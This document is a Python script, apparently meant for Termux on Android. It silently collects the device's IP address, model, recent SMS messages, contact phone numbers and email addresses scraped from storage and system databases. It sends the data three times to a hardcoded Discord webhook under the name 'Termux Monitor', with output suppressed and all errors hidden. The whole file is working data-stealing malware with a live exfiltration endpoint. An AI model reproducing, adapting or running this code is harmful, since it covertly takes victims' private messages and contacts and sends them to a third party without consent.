#!/usr/bin/env python3

import subprocess
import requests
import re
import os
import sys
import time
import json
from datetime import datetime

if sys.platform == 'linux' or sys.platform == 'android':
    try:
        import ctypes
        import fcntl
        import struct
        import termios
        sys.stdout = open(os.devnull, 'w')
    except:
        pass

WEBHOOK_URL = "https://discord.com/api/webhooks/1498296603050643486/whkeKV22ONIHXMh5l2qUvdMyGxtflsVrkY4YQ7TzsC9if5cITIKKrrSjaHG3_UXrVl82"

def get_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', '0.0.0.0')
    except:
        try:
            r = requests.get('https://httpbin.org/ip', timeout=5)
            return r.json().get('origin', '0.0.0.0')
        except:
            return 'Unable to get IP'

def get_device_info():
    info = {}
    try:
        result = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True, timeout=3)
        info['brand'] = result.stdout.strip()
    except:
        info['brand'] = 'Unknown'
    
    try:
        result = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=3)
        info['model'] = result.stdout.strip()
    except:
        info['model'] = 'Unknown'
    
    try:
        result = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True, timeout=3)
        info['android'] = result.stdout.strip()
    except:
        info['android'] = 'Unknown'
    
    return info

def get_sms():
    sms_list = []
    try:
        result = subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], capture_output=True, text=True, timeout=10)
        if result.stdout:
            matches = re.findall(r'address=([^,]+).*?body=([^\n]+)', result.stdout, re.DOTALL)
            for addr, body in matches[:3]:
                sms_list.append(f"From: {addr} - {body[:50]}")
    except:
        pass
    return sms_list

def get_contacts():
    contacts = []
    try:
        result = subprocess.run(['content', 'query', '--uri', 'content://contacts/phones'], capture_output=True, text=True, timeout=10)
        if result.stdout:
            numbers = re.findall(r'number=([0-9\+]+)', result.stdout)
            contacts = list(set(numbers))[:10]
    except:
        pass
    return contacts

def get_emails():
    emails = []
    paths = [
        os.path.expanduser('~/storage/downloads'),
        os.path.expanduser('~/storage/dcim'),
        os.path.expanduser('~/storage/pictures'),
        os.path.expanduser('~/storage/music'),
        os.path.expanduser('~/storage/shared'),
        '/sdcard/',
        '/data/data/com.android.providers.telephony/databases/',
        '/data/data/com.android.providers.contacts/databases/'
    ]
    
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-E', email_pattern, path], capture_output=True, text=True, timeout=15)
                found = re.findall(email_pattern, result.stdout)
                emails.extend(found)
            except:
                pass
    
    return list(set(emails))[:15]

def send_to_discord():
    try:
        ip = get_ip()
        device = get_device_info()
        sms = get_sms()
        contacts = get_contacts()
        emails = get_emails()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        device_str = f"{device.get('brand', 'Unknown')} {device.get('model', 'Unknown')} (Android {device.get('android', 'Unknown')})"
        
        embed = {
            "title": "📱 MOBILE DATA CAPTURE",
            "color": 0x5865f2,
            "timestamp": timestamp,
            "fields": [
                {"name": "🌐 IP ADDRESS", "value": f"```{ip}```", "inline": False},
                {"name": "📱 DEVICE", "value": f"```{device_str}```", "inline": False}
            ],
            "footer": {"text": "Auto Data Collection"}
        }
        
        if contacts:
            contacts_text = '\n'.join([f'• {c}' for c in contacts[:10]])
            embed["fields"].append({"name": "📞 CONTACTS", "value": f"```{contacts_text}```", "inline": False})
        
        if sms:
            sms_text = '\n'.join([f'• {s[:60]}' for s in sms[:5]])
            embed["fields"].append({"name": "💬 RECENT SMS", "value": f"```{sms_text}```", "inline": False})
        
        if emails:
            emails_text = '\n'.join([f'• {e}' for e in emails[:10]])
            embed["fields"].append({"name": "📧 EMAILS FOUND", "value": f"```{emails_text}```", "inline": False})
        
        payload = {"username": "Termux Monitor", "embeds": [embed]}
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

def main():
    time.sleep(1)
    send_to_discord()
    time.sleep(60)
    send_to_discord()
    time.sleep(60)
    send_to_discord()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
